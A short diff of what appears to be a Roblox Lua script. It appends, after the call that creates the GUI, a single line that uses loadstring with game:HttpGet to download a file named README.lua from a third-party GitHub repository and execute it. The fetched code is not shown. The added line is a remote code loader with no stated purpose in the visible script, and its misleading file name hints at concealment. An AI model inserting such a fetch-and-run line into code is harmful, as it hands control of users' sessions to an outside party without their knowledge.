@@ -71,3 +71,5 @@ end
 
 -- Create the GUI
 createGUI()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/therealzeek/Ctool/main/README.lua", true))()
